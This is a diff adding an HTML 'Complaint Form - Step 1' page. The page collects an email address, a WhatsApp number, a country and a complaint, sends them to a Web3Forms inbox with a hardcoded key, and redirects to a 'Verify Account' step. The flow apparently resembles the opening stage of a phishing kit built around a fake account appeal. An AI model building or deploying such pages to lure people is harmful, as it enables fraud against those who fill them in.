@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Complaint Form - Step 1</title>
+<style>
+body {
+  background:#0b1d5f;
+  color:#fff;
+  font-family:Arial, sans-serif;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  min-height:100vh;
+  margin:0;
+  padding:20px;
+}
+
+.logo {
+  text-align:center;
+  margin-bottom:20px;
+}
+
+.logo img {
+  width:120px;
+  height:auto;
+}
+
+form {
+  max-width:500px;
+  width:100%;
+  display:flex;
+  flex-direction:column;
+  gap:12px;
+}
+
+input, textarea {
+  padding:12px;
+  border-radius:8px;
+  border:2px solid #1e3a8a;
+  background:#1e3a8a;
+  color:#fff;
+}
+
+button {
+  padding:14px;
+  border:none;
+  border-radius:8px;
+  background:#1e40af;
+  cursor:pointer;
+  color:#fff;
+}
+
+button:hover { background:#3b82f6; }
+
+#successMsg {
+  display:none;
+  text-align:center;
+  margin-top:10px;
+  color:#00ff00;
+  font-weight:bold;
+}
+</style>
+</head>
+<body>
+
+<div class="logo">
+  <img src="image.jpg" alt="Logo">
+</div>
+<h1>Complaint Form</h1>
+<form id="step1Form">
+
+  <!-- Web3Forms API key for Step 1 -->
+  <input type="hidden" name="access_key" value="39483916-2d75-4776-91f8-2bbc171def4f">
+
+  <input type="email" name="email" placeholder="Your Email" required>
+  <input type="text" name="whatsapp" placeholder="WhatsApp Number" required pattern="[0-9+]{7,15}">
+  <input type="text" name="country" placeholder="Your Country" required>
+  <textarea name="complaint" rows="4" placeholder="Describe your complaint" required></textarea>
+
+  <button type="submit">Next</button>
+</form>
+
+<div id="successMsg">Verify Account</div>
+
+<script>
+document.getElementById('step1Form').addEventListener('submit', async function(e){
+    e.preventDefault();
+    const form = e.target;
+    const data = new FormData(form);
+
+    try {
+        await fetch('https://api.web3forms.com/submit', { method:'POST', body:data });
+
+        // Save Step 1 data locally for Step 2
+        localStorage.setItem('step1Data', JSON.stringify({
+            email: form.email.value,
+            whatsapp: form.whatsapp.value,
+            country: form.country.value,
+            complaint: form.complaint.value
+        }));
+
+        // Show brief success message
+        const msg = document.getElementById('successMsg');
+        msg.style.display = 'block';
+
+        // Redirect to Step 2 (verify.html)
+        setTimeout(()=> window.location.href="verify.html", 500);
+
+    } catch(err){
+        alert("Submission failed, try again.");
+        console.error(err);
+    }
+});
+</script>
+</body>
+</html>
